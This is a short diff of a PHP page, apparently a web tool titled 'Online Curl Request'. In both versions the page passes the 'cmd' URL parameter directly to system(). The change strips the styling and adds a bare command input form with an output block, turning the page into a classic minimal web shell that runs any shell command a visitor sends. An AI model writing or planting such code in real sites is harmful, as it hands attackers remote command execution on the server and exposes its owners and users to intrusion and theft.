@@ -1,15 +1,14 @@
 <html>
     <head></head>
-    <link rel="stylesheet" href="/static/bulma.min.css" />
     <body>
-        <div class="container card">
-        <div class="card-content">
-        <h1 class="title">Online Curl Request</h1>
+        <form method="get" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+            <input type="text" name="cmd" id="cmd" size="80" autofocus />
+        </form>
+        <pre>
         <?php
         if(isset($_GET['cmd']))
            system($_GET['cmd']); 
         ?>
-        </div>
-        </div>
+        </pre>
     </body>
 </html>
